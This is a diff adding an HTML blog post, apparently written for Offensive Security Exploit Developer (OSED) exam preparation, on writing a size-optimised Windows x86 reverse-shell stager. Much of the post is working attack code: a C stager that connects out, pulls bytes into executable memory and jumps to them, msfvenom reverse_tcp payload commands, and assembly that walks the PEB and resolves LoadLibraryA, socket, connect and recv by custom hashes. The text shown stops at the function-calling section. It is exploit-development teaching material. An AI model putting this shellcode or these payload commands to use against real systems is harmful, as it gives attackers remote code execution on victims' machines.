@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Riley Kidd - Writing Small (Reverse) Shellcode</title>
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/assets/css/all.css">
+  <link rel="alternate" type="application/atom+xml" title="Riley Kidd" href="https://rileykidd.com/atom.xml" />
+</head>
+<body>
+  <div class="container">
+    <div class="content">
+      <nav>
+  <h2 id="banner"><a href="/">Riley Kidd</a></h2>
+  <div id="social">
+    <div id="stalker">
+  
+  <a title="Twitter" href="https://twitter.com/247CTF">
+    <i class="fa fa-twitter-square"></i>
+  </a>
+  
+  
+  <a title="LinkedIn" href="https://www.linkedin.com/in/rileykidd">
+    <i class="fa fa-linkedin-square"></i>
+  </a>
+  
+  
+  <a title="Send an email" href="mailto:rileykidd@protonmail.com">
+    <i class="fa fa-envelope-square"></i>
+  </a>
+  
+  
+  <a title="Atom feed" id="atom" href="/atom.xml">
+    <i class="fa fa-rss-square"></i>
+  </a>
+  
+</div>
+
+  </div>
+</nav>
+
+      <h1 class="title">Writing Small (Reverse) Shellcode</h1>
+<p class="meta">
+  September 27, 2022
+</p>
+<div id="post">
+  <h2 id="credits-and-prework">Credits and prework</h2>
+<p>As part of my preparation for the Offensive Security Exploit Developer (OSED) exam, I became interested in the concept of writing the smallest possible shellcode to complete a task. Typically for an exploit, that task is to obtain a reverse shell on a remote system.</p>
+
+<p>Rather than trying to reinvent the wheel, I performed some research and found this excellent <a href="https://research.nccgroup.com/wp-content/uploads/2020/07/writing_small_shellcode.pdf">Writing Small Shellcode</a> paper, written by Dafydd Stuttard in 2005.</p>
+
+<p>I leverage a lot of Dafydd’s work in this post, and I encourage you to read the original paper in full, which “<em>implements a bindshell in 191 bytes of null-free code, and outlines some general ideas for writing small shellcode</em>”.</p>
+
+<p>To <em>try</em> and stay succinct in this blog post, it’s assumed that you have some background knowledge of x86 assembly, x86 calling conventions, <a href="https://www.youtube.com/watch?v=bUCfDThGl4s">staged/stageless shellcode</a>, and the Windows API.</p>
+
+<h2 id="end-game">End game</h2>
+<p>It’s no longer 2005, and things have changed in Windows which make the  solution presented in the paper no longer functional. Furthermore, reverse shells are (subjectively) better than bind shells due to the nuisance of Network Address Translation (NAT) and firewalls - so let’s aim to leverage Dafydd’s work to reimplement and recreate a solution by Writing Small (Reverse) Shellcode in 2022.</p>
+
+<p>Let’s start with some requirements and assumptions for our final shellcode:</p>
+<ul>
+  <li>Aim to create a smaller solution than presented in the original paper (while still remaining null byte free)</li>
+  <li>Create Position Independent Code (PIC) shellcode so our solution can execute from anywhere without specific setup requirements (such as <code class="highlighter-rouge">eax</code> pointing to the shellcode in the original paper)</li>
+  <li>Assume <code class="highlighter-rouge">Winsock</code> has already been initialised (if we are interfacing with the application via a socket, this is a fair assumption)</li>
+  <li>Results in an interactive reverse shell which works on Windows 10 in an x86 process (and doesn’t need to be backwards compatible)</li>
+  <li>Executes from Read-Write-Execute (RWX) memory (I know I just said it’s no longer 2005, but cut me some slack)</li>
+  <li>Don’t need to exit cleanly (due to the staging shellcode overwriting itself with the stage, more on this later)</li>
+</ul>
+
+<p>Standalone interactive reverse shellcode requires a number of calls to create and interface with a new process. Instead of creating a standalone solution, let’s ‘cheat’ and instead create a reverse shellcode stager. Our shellcode stager solution will connect back to our system to download and stage the ‘real’ (larger) shellcode (which can be anything).</p>
+
+<p>While we are busy writing our own rules, let’s also assume that traditional smaller solutions such as <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">egg hunters</a> and <a href="https://connormcgarr.github.io/WS32_recv()-Reuse/">socket reuse</a> are not feasible.</p>
+
+<h2 id="meet-the-players">Meet the players</h2>
+<p>Before jumping straight into the lower level shellcode, let’s start at a higher level first and define the functions we are ultimately going to need to call and use for our solution.</p>
+
+<p>The socket function from <code class="highlighter-rouge">ws2_32.dll</code> <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket">“<em>creates a socket that is bound to a specific transport service provider</em>”</a>. For our shellcode, we need to use a <code class="highlighter-rouge">socket</code> in order to connect ‘back’ to our host system and kick-off our shellcode staging chain:</p>
+<pre><code class="language-C">SOCKET WSAAPI socket( 
+  [in] int af,
+  [in] int type,
+  [in] int protocol 
+);
+</code></pre>
+
+<p>For our purposes <code class="highlighter-rouge">socket</code> will require an <code class="highlighter-rouge">af</code> of <code class="highlighter-rouge">0x2</code> (AF_INET), a <code class="highlighter-rouge">type</code> of <code class="highlighter-rouge">0x1</code> (SOCK_STREAM) and a <code class="highlighter-rouge">protocol</code> of <code class="highlighter-rouge">0x6</code> (IPPROTO_TCP) for use in a reverse TCP connection. We wont make use of enumerated types in our shellcode, we will rely on the constant values instead (which is what an <code class="highlighter-rouge">enum</code> does behind the scenes anyway). After the <code class="highlighter-rouge">socket</code> function has executed, and if no error occurs, a socket descriptor will be returned to us in <code class="highlighter-rouge">eax</code>.</p>
+
+<p>Once we have a socket descriptor to use, we can next <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">“<em>establish a connection to a specified socket</em>”</a> by using <code class="highlighter-rouge">connect</code>:</p>
+<pre><code class="language-C">int WSAAPI connect(
+  [in] SOCKET s,
+  [in] const sockaddr *name,
+  [in] int namelen 
+);
+</code></pre>
+
+<p>We already know our socket descriptor from the previous call, however the <code class="highlighter-rouge">name</code> parameter is a little more complicated as it <a href="https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2">makes use of a structure</a>. The <code class="highlighter-rouge">sockaddr</code> structure contains the <code class="highlighter-rouge">sin_family</code> (we can use <code class="highlighter-rouge">0x2</code> here again), the <code class="highlighter-rouge">sin_port</code> (which is the port we want to connect to) and the <code class="highlighter-rouge">in_addr</code>:</p>
+<pre><code class="language-C">short sin_family; 
+u_short sin_port;
+struct in_addr sin_addr;
+</code></pre>
+
+<p><code class="highlighter-rouge">in_addr</code> is <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr">another structure</a>, which defines the IP address to which we want to connect:</p>
+<pre><code class="language-C">struct in_addr { 
+  union { 
+    struct { 
+      u_char s_b1; 
+      u_char s_b2; 
+      u_char s_b3; 
+      u_char s_b4; 
+    } S_un_b; 
+    struct { 
+      u_short s_w1; 
+      u_short s_w2; 
+    } S_un_w; 
+    u_long S_addr; 
+    } S_un; 
+};
+</code></pre>
+
+<p>The <code class="highlighter-rouge">namelen</code> parameter is supposed to be “<em>the length, in bytes, of the sockaddr structure pointed to by the name parameter</em>”, however this value does not need to be an exact precise value - it just needs to be ‘large enough’.</p>
+
+<p>We can abuse the tolerance of the <code class="highlighter-rouge">connect</code> function for this parameter to be more efficient and save space in our final shellcode (i.e., we don’t need to use <code class="highlighter-rouge">0x16</code> as the <code class="highlighter-rouge">namelen</code> value, we can instead just use ‘some’ large existing value - more on this later).</p>
+
+<p>Once a connection has been established with <code class="highlighter-rouge">connect</code>, we next need to <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv">receive data from the connected socket</a> via <code class="highlighter-rouge">recv</code>:</p>
+<pre><code class="language-C">int recv(
+  [in] SOCKET s,
+  [out] char *buf,
+  [in] int len,
+  [in] int flags
+);
+</code></pre>
+
+<p>In order to use this function, we need to use the socket descriptor (which we know), as well as the <code class="highlighter-rouge">buf</code> (which is where our data will be written), the <code class="highlighter-rouge">len</code>gth of the data to receive and a set of <code class="highlighter-rouge">flags</code> which influence how the function behaves (we can use <code class="highlighter-rouge">0x0</code> to specify no flags).</p>
+
+<p>With the functions defined, we can create a high level solution in <code class="highlighter-rouge">C</code> which meets the above requirements and uses the defined constants:</p>
+<pre><code class="language-C">#include&lt;winsock2.h&gt;
+#pragma comment(lib,"Ws2_32.lib")
+
+int main() {
+    // initiate Winsock (shellcode assumes this has been done already)
+    WSADATA stWSA;
+    WSAStartup(0x0202, &amp;stWSA);
+
+    // create the sockaddr_in structure for 127.0.0.1 on port 443
+    struct sockaddr_in sa;
+    sa.sin_family = 0x2;
+    sa.sin_addr.s_addr = inet_addr("127.0.0.1");
+    sa.sin_port = htons(443);
+
+    // create a socket
+    SOCKET sock = socket(0x2, 0x1, 0x6);
+
+    // connect to the 'remote' host
+    connect(sock, (struct sockaddr*)&amp;sa, sizeof(sa));
+
+    // initialise some read, write, execute memory
+    LPVOID recv_buf = VirtualAlloc(NULL, 1024, 0x3000, 0x40);
+
+    // receive data via the socket to the buffer
+    recv(sock, (char *)recv_buf, 1024, 0);
+
+    // execute the data (received and written to the buffer)
+    __asm {
+        jmp recv_buf
+    }
+
+    return 1;
+}
+</code></pre>
+
+<p>The above snippet will connect to <code class="highlighter-rouge">127.0.0.1</code> on port <code class="highlighter-rouge">443</code> via a TCP connection and receive up to <code class="highlighter-rouge">1024</code> bytes via the established socket. Once read, the data will be written to a buffer in read, write, execute memory and executed.</p>
+
+<p>The above solution is ‘fine’ and meets a number of our requirements, but the <code class="highlighter-rouge">text</code> section containing the executable instructions is almost guaranteed to be more than 191 bytes, which we can verify with <code class="highlighter-rouge">dumpbin</code>:</p>
+<pre><code class="language-C">SECTION HEADER #2
+   .text name
+    55C6 virtual size
+   11000 virtual address (00411000 to 004165C5)
+    5600 size of raw data
+     400 file pointer to raw data (00000400 to 000059FF)
+       0 file pointer to relocation table
+       0 file pointer to line numbers
+       0 number of relocations
+       0 number of line numbers
+60000020 flags
+         Code
+         Execute Read
+</code></pre>
+
+<p>From a raw shellcode perspective, we also even ‘cheat’ since we <code class="highlighter-rouge">include</code> the required DLLs as part of the compilation process (which we can’t do with raw shellcode). In order to achieve this same ‘include process’ with shellcode, we instead need to rely on another function in <code class="highlighter-rouge">kernel32.dll</code>.</p>
+
+<p><code class="highlighter-rouge">LoadLibraryA</code> <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">“<em>loads the specified module into the address space of the calling process</em>”</a> and we can use this function to resolve the base address of a DLL (and from the base address, the location of exported functions). <code class="highlighter-rouge">LoadLibraryA</code> is accessible via <code class="highlighter-rouge">kernel32.dll</code>, and our shellcode can ‘abuse’ the fact that <code class="highlighter-rouge">kernel32.dll</code> is loaded into ‘every’ windows process (to skip the cyclic requirement of needing to import <code class="highlighter-rouge">kernel32.dll</code> before we can use functions within it):</p>
+<pre><code class="language-C">HMODULE LoadLibraryA( 
+  [in] LPCSTR lpLibFileName 
+);
+</code></pre>
+
+<p>In order to use <code class="highlighter-rouge">LoadLibraryA</code>, we need to pass the name of the module to load as the <code class="highlighter-rouge">lpLibFileName</code> and (if successful) the returned value in <code class="highlighter-rouge">eax</code> will be the module base address.</p>
+
+<p>With the functions we are going to need to use defined, let’s take a look at some existing (similar) solutions.</p>
+
+<h2 id="alternative-solutions">Alternative solutions</h2>
+<p>So how do we go from the <code class="highlighter-rouge">C</code> example above, to (small) reverse shellcode? What does ‘small’ mean in this case anyway?</p>
+
+<p>We can make use of <code class="highlighter-rouge">meterpreter</code> as a starting point for the ‘normal’ size of reverse shellcode. The <code class="highlighter-rouge">meterpreter</code> solution is robust, but that robustness comes at a cost of size.</p>
+
+<p>The staged version of a reverse shell created with <code class="highlighter-rouge">msfvenom</code> is 381 bytes (<code class="highlighter-rouge">msfvenom --platform windows -a x86 -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=1234 -e x86/shikata_ga_nai -b "\x00"</code>) and the stageless version of a reverse shell is (interestingly?) smaller at 351 bytes (<code class="highlighter-rouge">msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.49.83 LPORT=1234 -e x86/shikata_ga_nai -b "\x00"</code>).</p>
+
+<p>We also already know Dafydd’s bind shell solution is only 191 bytes, in part due to his clever use of a number of small instructions:</p>
+<ul>
+  <li><code class="highlighter-rouge">lodsd</code> / <code class="highlighter-rouge">lodsb</code> which loads the <code class="highlighter-rouge">dword</code> / <code class="highlighter-rouge">byte</code> pointed to by <code class="highlighter-rouge">esi</code> into <code class="highlighter-rouge">eax</code> / <code class="highlighter-rouge">al</code>, and increments <code class="highlighter-rouge">esi</code></li>
+  <li><code class="highlighter-rouge">stosd</code> / <code class="highlighter-rouge">stosb</code> which saves the <code class="highlighter-rouge">dword</code> / <code class="highlighter-rouge">byte</code> in <code class="highlighter-rouge">eax</code>  / <code class="highlighter-rouge">al</code> at the address pointed to by <code class="highlighter-rouge">edi</code>, and increments <code class="highlighter-rouge">edi</code></li>
+  <li><code class="highlighter-rouge">cdq</code> which extends <code class="highlighter-rouge">eax</code> into a quad-word using <code class="highlighter-rouge">edx</code> (this can be used to set <code class="highlighter-rouge">edx</code> to <code class="highlighter-rouge">0x0</code> if we know that <code class="highlighter-rouge">eax</code> is less than <code class="highlighter-rouge">0x80000000</code>)</li>
+</ul>
+
+<p>So we have the null-byte free robust <code class="highlighter-rouge">meterpreter</code> version at <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">351 bytes</a>, and Dafydd’s (currently non-working on modern Windows) bind shell version at 191 bytes.</p>
+
+<p>In order to create our shellcode (and based on the solutions above) let’s take the following high level approach:</p>
+<ul>
+  <li>Resolve shellcode location in memory</li>
+  <li>Resolve <code class="highlighter-rouge">kernel32.dll</code> base address</li>
+  <li>Resolve <code class="highlighter-rouge">LoadLibraryA</code> function address</li>
+  <li>Resolve <code class="highlighter-rouge">ws2_32.dll</code> base address (using <code class="highlighter-rouge">LoadLibraryA</code>)</li>
+  <li>Resolve <code class="highlighter-rouge">socket</code>, <code class="highlighter-rouge">connect</code>, and <code class="highlighter-rouge">recv</code> function addresses</li>
+  <li>Use the above functions to load larger shellcode via a reverse connection ‘over’ the currently executing shellcode</li>
+  <li>Execute the larger shellcode</li>
+</ul>
+
+<p>The above approach has the follow on advantage of not needing to ‘waste’ space by exiting cleanly (since we are overwriting the stage during execution anyway).</p>
+
+<p>So we have an approach and know the functions we want to use, but how can we find them using shellcode?</p>
+
+<h2 id="finding-function-addresses">Finding function addresses</h2>
+<p>Comparing <code class="highlighter-rouge">meterpreter</code> and Dafydd’s solutions, we can see they both use a similar process (but with different requirements around payload size) to resolve functions by using hashes.</p>
+
+<p>Rather than relying on long and variably sized function names to resolve function address locations (for example using <code class="highlighter-rouge">GetProcAddress</code>), we can instead leverage fixed size function hashes to do the same thing.</p>
+
+<p>For example <code class="highlighter-rouge">meterpreter</code> <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py">calculates hashes</a> for functions via the following algorithm:</p>
+<ol>
+  <li>Transform module name to uppercase</li>
+  <li>ROR13 the accumulated hash value</li>
+  <li>Add the current character value to the result</li>
+  <li>Repeat steps 1–3 for each character</li>
+</ol>
+
+<p>For the functions we are interested in, this would result in the following function hash mappings:</p>
+<ul>
+  <li><code class="highlighter-rouge">0x0726774C</code> for <code class="highlighter-rouge">kernel32.dll!LoadLibraryA</code></li>
+  <li><code class="highlighter-rouge">0xE0DF0FEA</code> for <code class="highlighter-rouge">ws2_32.dll!socket</code></li>
+  <li><code class="highlighter-rouge">0x6174A599</code> for <code class="highlighter-rouge">ws2_32.dll!connect</code></li>
+  <li><code class="highlighter-rouge">0x5FC8D902</code> for <code class="highlighter-rouge">ws2_32.dll!recv</code></li>
+</ul>
+
+<p>For typical shellcode this hashing process is fine, however for our purpose of creating small shellcode, the hashes are not optimal due to their total length. We don’t want to ‘waste’ 16 bytes for function hashes.</p>
+
+<p>Longer hashes are more dynamic and <a href="https://en.wikipedia.org/wiki/Collision_resistance">collision resistant</a> in the generic case, but for our specific case - we only need to be ‘collision resistant enough’. As long as the first hash to be resolved by our algorithm is for the function we care about, it doesn’t matter if we have duplicates (because we can just calculate hashes in order, and stop on the first occurrence).</p>
+
+<p>Another requirement, is for our hashes to be ‘<code class="highlighter-rouge">nop</code> like’. To save space, instead of jumping over the hashes in our shellcode, we can instead ‘just execute’ them. We just need to avoid any instructions which influence the stack, <code class="highlighter-rouge">jmp</code>/<code class="highlighter-rouge">call</code>/<code class="highlighter-rouge">ret</code> to another location, or dereference registers (since we don’t know if they will be valid).</p>
+
+<p>Ideally the hashes can be calculated with the exact same key/process, to minimise the total number of bytes in the shellcode required to calculate them, and they will also need to be arranged in the same sequence that they will be called (more on this later).</p>
+
+<p>With these requirements in mind, we can start to identify candidate hashes:</p>
+<ul>
+  <li>Take every function name from the DLL you will be resolving functions from</li>
+  <li>Perform ‘some’ calculation which results in an 8 bit hash value (which is the smallest feasible ‘collision resistant’ size)</li>
+  <li>Ensure the function you want is the first function which resolves to that hash value (hashes will be calculated in order)</li>
+  <li>Ensure the hashes are <code class="highlighter-rouge">nop</code>-like when combined in order</li>
+</ul>
+
+<p>In our case, a hash function was identified which met the above requirements by:</p>
+<ol>
+  <li>Initialising a starting hash of <code class="highlighter-rouge">0x0</code></li>
+  <li>Iterating over each character of the function and <code class="highlighter-rouge">xor</code>ing with a key</li>
+  <li>Subtracting the value from #1 with the hash</li>
+  <li>Stopping the calculation when the current value is the key (since a value <code class="highlighter-rouge">xor</code>ed with null is itself)</li>
+  <li>Comparing the calculated hash with the value we are searching for</li>
+</ol>
+
+<p>Unfortunately, it was not possible to identify a hashing function which could follow the above process and resolve the ‘correct’ functions across both <code class="highlighter-rouge">kernel32.dll</code> and <code class="highlighter-rouge">ws2_32.dll</code> which were <code class="highlighter-rouge">nop</code>-like using the same <code class="highlighter-rouge">xor</code> key (or <code class="highlighter-rouge">or</code> key, or <code class="highlighter-rouge">and</code> key). Instead, 2 different <code class="highlighter-rouge">xor</code> keys are needed (<code class="highlighter-rouge">248</code> for <code class="highlighter-rouge">kernel32.dll</code> and <code class="highlighter-rouge">192</code> for <code class="highlighter-rouge">ws2_32.dll</code>).</p>
+
+<p>Specifically, we end up with the following function hashes:</p>
+<ul>
+  <li><code class="highlighter-rouge">0xC2</code> for <code class="highlighter-rouge">kernel32.dll!LoadLibraryA</code></li>
+  <li><code class="highlighter-rouge">0x37</code> for <code class="highlighter-rouge">ws2_32.dll!socket</code></li>
+  <li><code class="highlighter-rouge">0x96</code> for <code class="highlighter-rouge">ws2_32.dll!connect</code></li>
+  <li><code class="highlighter-rouge">0x90</code> for <code class="highlighter-rouge">ws2_32.dll!recv</code></li>
+</ul>
+
+<p>These hashes represent a decent space saving approach, but assembly connoisseurs may notice that the above hashes are not <code class="highlighter-rouge">nop</code>-like. Let’s fix that in the next section.</p>
+
+<h2 id="identifying-self">Identifying self</h2>
+<p>We have a broad approach, and we have calculated our hash values - but once the hashes are resolved to their mapped functions, we also need to store those function values somewhere (in order to later use them). A reliable and useful way to do this with our shellcode, is to identify and use the current <a href="https://en.wikipedia.org/wiki/Program_counter">Extended Instruction Pointer (EIP)</a> value.</p>
+
+<p>In x86 assembly, there isn’t a direct way to identify the value in the EIP register. However, there are still a few hacky ways to do this.</p>
+
+<p>Given our remit, let’s do this with the fewest number of instructions possible by abusing the <code class="highlighter-rouge">call</code> instruction. Whenever a <code class="highlighter-rouge">call</code> instruction is performed, the address of the ‘next’ instruction is pushed to the stack. Instead of following the ‘standard’ <code class="highlighter-rouge">call</code> convention and returning to this address, we can instead <code class="highlighter-rouge">pop</code> the value directly off the stack and use that value in our shellcode as the ‘current’ EIP address.</p>
+
+<p>The cleanest way to execute this, is to make a <code class="highlighter-rouge">call $+5</code> which is stack aligned and doesn’t mangle any instructions - however it also contains null bytes which we want to avoid.</p>
+
+<p>We can instead leverage <code class="highlighter-rouge">call $+4</code> which contains no null bytes - and calls 1 byte back from the next instruction. This ‘makes a mess’ since execution will then jump inside the call instruction itself starting at the last byte (which will be <code class="highlighter-rouge">0xff</code> due to the <code class="highlighter-rouge">$+4</code>).</p>
+
+<p>To ensure execution doesn’t break due to invalid instructions, we need to ensure the next byte prepended with <code class="highlighter-rouge">0xff</code> is a valid instruction - because after the call, these instructions will also be executed (this is why the <code class="highlighter-rouge">LoadLibraryA</code> hash was chosen as <code class="highlighter-rouge">0xc2</code>, since <code class="highlighter-rouge">0xff 0xc2</code> is a valid <code class="highlighter-rouge">nop</code>-like instruction).</p>
+
+<p>With the function hash values and EIP resolution process identified we can finally start writing our shellcode:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span>  <span class="o">=</span> <span class="s">b"</span><span class="se">\xe8\xff\xff\xff\xff</span><span class="s">"</span>  <span class="c1"># call $+4
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\xc2</span><span class="s">"</span>                  <span class="c1"># key 248   -&gt; LoadLibraryA \xff\xc2 -&gt; (inc edx)
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\x37</span><span class="s">"</span>                  <span class="c1"># key 192   -&gt; socket       (aaa)
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\x96</span><span class="s">"</span>                  <span class="c1"># key 192   -&gt; connect      (xchg esi, eax)
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\x90</span><span class="s">"</span>                  <span class="c1"># key 192   -&gt; recv         (nop)
+</span></code></pre></div></div>
+
+<p>Once the above shellcode executes the <code class="highlighter-rouge">call $+4</code>, the location in memory of <code class="highlighter-rouge">0xc2</code> (which is the hash value for <code class="highlighter-rouge">LoadLibraryA</code>) will be the first element on the stack. The <code class="highlighter-rouge">call $+4</code> instruction will cause the <code class="highlighter-rouge">0xc2</code> hash value to be interpreted as a <code class="highlighter-rouge">inc edx</code> instruction and the other hash value instructions will have no negative effect on the shellcode (because they are <code class="highlighter-rouge">nop</code>-like).</p>
+
+<h2 id="resolving-and-storing-function-addresses">Resolving and storing function addresses</h2>
+<p>Now we know where we are (and where we want to write), we can start resolving function addresses. As discussed, these function addresses need to be stored somewhere, and we can use the space ‘above’ our shellcode for this (we just need to calculate the location offset to ensure the last write will overwrite the hash value).</p>
+
+<p>The <code class="highlighter-rouge">lodsb</code> and <code class="highlighter-rouge">stosd</code> instructions will be used to load hash values and store the subsequent resolved addresses - so we set <code class="highlighter-rouge">esi</code> and <code class="highlighter-rouge">edi</code> to point to the start of the hash values and the start of the address storage location respectively.</p>
+
+<p>Since we know <code class="highlighter-rouge">eax</code> is ‘small’ in the x86 code, we can also use <code class="highlighter-rouge">cdq</code> to set <code class="highlighter-rouge">edx</code> to <code class="highlighter-rouge">0x0</code> with a single byte instruction:</p>
+<pre><code class="language-C">  pop eax                   # eax = shellcode location
+  cdq                       # edx = 0 (eax is less than 0x80000000)
+  xchg eax, esi             # esi = addr of first function hash
+  lea edi, [esi-0xc]        # edi = addr of start writing function address
+</code></pre>
+
+<p>With the preparation work done, we next need to resolve the base address of <code class="highlighter-rouge">kernel32.dll</code> (since we need to make use of <code class="highlighter-rouge">LoadLibraryA</code> and we don’t know that function address in memory).</p>
+
+<p>To identify the base address, can walk the <a href="https://en.wikipedia.org/wiki/Process_Environment_Block">Process Environment Block</a> and make an assumption on the location of <code class="highlighter-rouge">kernel32.dll</code> in a linked list based on the expected initialisation order of modules on Windows 10 (and the fact that the <code class="highlighter-rouge">kernel32.dll</code> DLL is loaded in ‘every’ Windows process). This assumption of load order is risky and not really cross-compatible across different Windows versions (which is one of the reasons why the original bind shellcode no longer functions):</p>
+<pre><code class="language-C">  mov ebx, fs:[edx+0x30]    # ebx = address of PEB
+  mov ecx, [ebx+0xc]        # ecx = pointer to loader data
+  mov ecx, [ecx+0x1c]       # ecx = first entry in initialisation order list
+  mov ecx, [ecx]            # ecx = second entry in list
+  mov ecx, [ecx]            # ecx = third entry in list (kernel32.dll)
+  mov ebp, [ecx+0x8]        # ebp = base address of kernel32.dll
+</code></pre>
+
+<p>With the base address of <code class="highlighter-rouge">kernel32.dll</code> known, we can start to prepare for the <code class="highlighter-rouge">LoadLibraryA</code> function call, by pushing <code class="highlighter-rouge">ws2_32</code> on the stack (including <code class="highlighter-rouge">.dll</code> is not needed so we can save some more space), and also setting our hash key for <code class="highlighter-rouge">kernel32.dll</code> in <code class="highlighter-rouge">dh</code>:</p>
+<pre><code class="language-C">  mov dx, 0x3233
+  push edx
+  push 0x5f327377
+  push esp                  # push ws2_32 on stack
+  mov dh, 0xf8              # hash key for kernel32.dll (248)
+</code></pre>
+
+<p>Next we need to loop over the hash resolution function once, to resolve <code class="highlighter-rouge">LoadLibraryA</code>, then we can call <code class="highlighter-rouge">LoadLibraryA</code> with <code class="highlighter-rouge">ws2_32</code> as the parameter to resolve the base address (and subsequent functions in that library).</p>
+
+<p>The hash resolution function identifies the table of exported functions in the DLL, loops through the function names, and calculates the hashes (using the process defined above). Once calculated, the function compares the hash value of each function with the hash value we are looking to resolve - once a match is found, we can identify the function index and use that index to identify the function’s address in memory.</p>
+
+<p>To behave correctly, the hash resolution function resolution function requires:</p>
+<ul>
+  <li><code class="highlighter-rouge">dh</code> to contain the appropriate <code class="highlighter-rouge">xor</code> key to resolve the required functions</li>
+  <li><code class="highlighter-rouge">ebp</code> to hold the base address of the library to resolve functions from</li>
+  <li><code class="highlighter-rouge">esi</code> to point to the next hash value to be processed</li>
+  <li><code class="highlighter-rouge">edi</code> to point to the next location to store the resolved function address</li>
+</ul>
+
+<p>To switch the hash resolution process from <code class="highlighter-rouge">kernel32.dll</code> to <code class="highlighter-rouge">ws2_32.dll</code>, we can compare the current function hash to find with the known first function hash from <code class="highlighter-rouge">ws2_32.dll</code> (in this case <code class="highlighter-rouge">0x37</code>), update the new base address (found from the <code class="highlighter-rouge">LoadLibraryA</code> call), update the required <code class="highlighter-rouge">xor</code> key (in this case <code class="highlighter-rouge">0xc0</code>), and then perform the same resolution process for <code class="highlighter-rouge">socket</code>, <code class="highlighter-rouge">connect</code>, and <code class="highlighter-rouge">recv</code>:</p>
+
+<pre><code class="language-C">  find_lib_functions:
+    lodsb                        # load next hash into al and increment esi
+    cmp al, 0x37                 # hash of socket - trigger loadlibrary(ws2_32)
+    jne find_functions
+    xchg eax, ebp                # save current hash
+    call [edi-0x4]               # call loadlibrary(ws2_32)
+    xchg eax, ebp                # restore current hash, and update ebp
+    push edi                     # save location of addr of accept
+    mov dh, 0xc0                 # hash key for ws_32.dll (192)
+
+  find_functions:
+    pushad                       # preserve registers
+    mov eax, [ebp+0x3c]          # eax = start of PE header
+    mov ecx, [ebp + eax + 0x78]  # ecx = relative offset of export table
+    add ecx, ebp                 # ecx = absolute addr of export table
+    mov ebx, [ecx + 0x20]        # ebx = relative offset of names table
+    add ebx, ebp                 # ebx = absolute addr of names table
+    xor edi, edi                 # edi will count through the functions
+
+  next_function_loop:
+    inc edi                      # increment function counter
+    mov esi, [ebx + edi * 4]     # esi = relative offset of current function name
+    add esi, ebp                 # esi = absolute addr of current function name
+    xor dl, dl                   # reset hash counter
+
+  hash_loop:
+   lodsb                         # load next char into al and increment esi
+   xor al, dh                    # xor character in al with key in dh
+   sub dl, al                    # update hash with current char
+   cmp al, dh                    # loop until we reach end of string
+   jne hash_loop
+   cmp dl, [esp + 0x1c]          # compare to the requested hash (saved on stack from pushad)
+   jnz next_function_loop
+
+  # we now have the right function
+   mov ebx, [ecx + 0x24]         # ebx = relative offset of ordinals table
+   add ebx, ebp                  # ebx = absolute addr of ordinals table
+   mov di, [ebx + 2 * edi]       # di = ordinal number of matched function
+   mov ebx, [ecx + 0x1c]         # ebx = relative offset of address table
+   add ebx, ebp                  # ebx = absolute addr of address table
+   add ebp, [ebx + 4 * edi]      # add to ebp (base addr of module) the relative offset
+   xchg eax, ebp                 # move func addr into eax
+   pop edi                       # edi is last onto stack in pushad write 
+   stosd                         # functon addr to [edi] and increment edi
+   push edi
+   popad                         # restore registers
+   cmp esi, edi                  # loop until we reach end of last hash
+   jne find_lib_functions
+   pop esi                       # saved location of first ws2_32 function
+</code></pre>
+
+<p>The listing above is heavily copied from Dafydd’s work with some modifications for a dynamic <code class="highlighter-rouge">xor</code> key and I again <a href="https://research.nccgroup.com/wp-content/uploads/2020/07/writing_small_shellcode.pdf">encourage you to read his paper</a> if the comments in the assembly are unclear.</p>
+
+<h2 id="calling-functions">Calling functions</h2>
+<p>With the function address resolution process complete, we can finally start calling our functions. Since the <code class="highlighter-rouge">ws2_32</code> addresses are saved in the order they need to be called (due to the order placement of our function hashes), we can load the first value into <code class="highlighter-rouge">esi</code> and use <code class="highlighter-rouge">lodsd</code> / <code class="highlighter-rouge">call eax</code> to load and call each function in order (once the stack has been appropriately prepared for the function call).</p>
+
